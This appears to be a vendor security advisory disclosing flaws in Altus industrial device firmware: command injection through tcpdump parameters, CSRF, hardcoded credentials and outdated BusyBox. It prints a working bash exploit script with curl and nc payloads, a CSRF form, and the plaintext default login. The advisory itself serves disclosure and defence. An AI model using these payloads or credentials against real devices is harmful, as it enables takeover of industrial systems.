Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult recommends to perform a thorough security review of these
products conducted by security professionals to identify and resolve all
security issues.

Vulnerability overview/description:
-----------------------------------
1) Authenticated Semi-Blind Command Injection via Parameter Injection (CVE-2021-39244)
The getlogs.cgi script allows authenticated users to start tcpdump on the
device. By injecting payloads into specific parameters it is also possible to
execute arbitrary OS commands. The output of these commands can be obtained in
another step.

2) Cross-Site Request Forgery (CSRF) (CVE-2021-39243)
The web interface that is used to set all configurations is vulnerable to
cross-site request forgery attacks. An attacker can change settings this way by
luring the victim to a malicious website.

3) Hardcoded Credentials for CGI Endpoint (CVE-2021-39245)
The getlogs.cgi script is exclusively htaccess-protected with hardcoded
credentials. These are shared with all firmware images from the series NX30xx,
HX30xx and XP3xx. These hardcoded credentials can be used to access the device
without a valid user account on application level and cannot be changed in the
user interface.

In combination with vulnerability 1), a full compromization on system level
with the only precondition of network access can be done.

4) Outdated and Vulnerable Software Components
A static scan with the IoT Inspector revealed outdated software packages that
are used in the devices' firmware.

The used BusyBox toolkit is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of the
discovered vulnerabilities (CVE-2017-16544) was verified by using the MEDUSA
scalable firmware runtime.

Proof of concept:
-----------------
1) Authenticated Semi-Blind Command Injection via Parameter Injection (CVE-2021-39244)
The following firmware extract of getlogs.cgi displays the vulnerability:
-------------------------------------------------------------------------------
TCPDUMP_IFACE=`echo "$QUERY_STRING" | sed -n 's/^.*tcpdump_iface=\([^&]*\).*$/\1/p' | sed "s/%20/ /g"`
TCPDUMP_COUNT=`echo "$QUERY_STRING" | sed -n 's/^.*tcpdump_count=\([^&]*\).*$/\1/p' | sed "s/%20/ /g"`
[...]
echo "tcpdump is running ..."
echo "<p>Please, wait the capture of $TCPDUMP_COUNT packets in $TCPDUMP_IFACE.</p>"
chrt -p -f 70 $$
tcpdump -i $TCPDUMP_IFACE -c $TCPDUMP_COUNT -w /tmp/capture.pcap
mount / -o rw,remount
ln -s /tmp/capture.pcap /usr/www/capture.pcap
mount / -o ro,remount
echo "<a href=\"capture.pcap\" download=\"$TCPDUMP_IFACE-capture.pcap\">Click here to download the capture file</a>"
-------------------------------------------------------------------------------
As it can be seen, the variables $TCPDUMP_COUNT and $TCPDUMP_IFACE are used
unfiltered in the tcpdump command. This means, that it is possible to inject
arbitrary parameters to the tcpdump command. The flag -z for tcpdump allows to
define a program that will run on the capture file. This behaviour can be used
to execute arbitrary commands. The following request injects parameters, so
that tcpdump listens on UDP port 1234 and will execute the capture file with
sh:
-------------------------------------------------------------------------------
GET /getlogs.cgi?logtype=tcpdump&tcpdump_iface=eth0&tcpdump_count=1%20-G%201%20-z%20sh%20-U%20-A%20udp%20port%201234
HTTP/1.1
Host: $IP
Authorization: Basic YWx0dXM6bmV4dG8xMjM0

-------------------------------------------------------------------------------
The next step to exploit this vulnerability is to send the commands to UDP port
1234:

$ echo -e ";\n$CMD &>/tmp/capture.pcap;\n'\n$CMD &>/tmp/capture.pcap;" | nc -u $TARGET_HOST $UDP_PORT

The command is sent twice because it is possible, that the capture file
contains a "'" before the sent payload. Injecting the commands twice with a "'"
in between makes sure, that the command will be executed by sh and not
interpreted as a string. The output of the executed command is redirected to
the file capture.pcap which can be accessed via the following request:
-------------------------------------------------------------------------------
GET /capture.pcap HTTP/1.1
Host: $IP
-------------------------------------------------------------------------------
These three steps are combined in the following proof of concept script:
-------------------------------------------------------------------------------
#!/bin/bash
#Author: D. Teuchert
CMD="whoami"
if [[ $# -eq 1 ]]; then
    CMD=$1
fi
TARGET_HOST="192.168.100.123"
UDP_PORT=1234
BASIC_AUTH_USERNAME="altus"
BASIC_AUTH_PASSWORD="nexto1234"
BASIC_AUTH_HEADER=$(printf "$BASIC_AUTH_USERNAME:$BASIC_AUTH_PASSWORD" | base64)

#Sending HTTP request with parameter injection in tcpdump
#Break out of tcpdump is done via a technique described here:
#<https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/>
curl -s -k -X "GET" -H "Host: $TARGET_HOST" -H "Authorization: Basic $BASIC_AUTH_HEADER"
"<http://$TARGET_HOST/getlogs.cgi?logtype=tcpdump&tcpdump_iface=eth0&tcpdump_count=1%20-G%201%20-z%20sh%20-U%20-A%20udp%20port%20$UDP_PORT">;>/dev/null &
#Send udp packet with payload
echo -e ";\n$CMD &>/tmp/capture.pcap;\n'\n$CMD &>/tmp/capture.pcap;" | nc -u $TARGET_HOST $UDP_PORT
echo -e "Executed \"$CMD\".\nResponse:"
#The output of the executed command was saved in capture.pcap
curl -s -k -X "GET" -H "Host: $TARGET_HOST" "[http://$TARGET_HOST/capture.pcap"](http://$TARGET_HOST/capture.pcap%22);
-------------------------------------------------------------------------------

2) Cross-Site Request Forgery (CSRF) (CVE-2021-39243)
The following CSRF proof-of-concept can be used to do the first step of the
command Injection exploitation:
-------------------------------------------------------------------------------
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[http://$IP/getlogs.cgi"](http://$IP/getlogs.cgi%22);>
      <input type="hidden" name="logtype" value="tcpdump" />
      <input type="hidden" name="tcpdump_iface" value="eth0" />
      <input type="hidden" name="tcpdump_count" value="1 -G 1 -z sh -U -A udp port 1234" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
-------------------------------------------------------------------------------

3) Hardcoded Credentials for CGI Endpoint (CVE-2021-39245)
The hardcoded credentials are present under "/etc/lighttpd/lighttpd-auth.conf":
altus:nexto1234

These credentials are exclusively used for the getlogs.cgi script. This is also
described in the lighttpd.conf which is located under the same directory:
-------------------------------------------------------------------------------
[...]
auth.debug = 0
auth.backend = "plain"
auth.backend.plain.userfile = "/etc/lighttpd/lighttpd-auth.conf"

auth.require = ( "/cgi/getlogs.cgi" =>
        (
                "method" => "basic",
                "realm" => "Password protected area",
                "require" => "user=altus"
        )
)
[...]
-------------------------------------------------------------------------------

4) Outdated and Vulnerable Software Components
Based on an automated scan with the IoT Inspector the following third party
software packages were found to be outdated:

Vendor's statement regarding issue 4):
"Altus continuously integrates new features and fixes in the products,
releasing new firmware versions. Often those improvements require the software
packages upgrading for several reasons, including security. When this happens,
we perform a set of tests to ensure that the performance, reliability, and
security were not negatively impacted by the upgrades. Although there are known
vulnerabilities in some software package versions, those vulnerabilities can
only be exploited if we compile those specific features and provide the means
to exploit them. The issue pointed out by SEC Consult, for instance, requires a
terminal to be exploited, which we don't provide in real hardware. Nowadays,
there isn't any known exploitable vulnerability caused by outdated software
packages in our products. Therefore, this item isn’t considered a vulnerability
by us."

Workaround:
-----------
Restrict network access to the device.
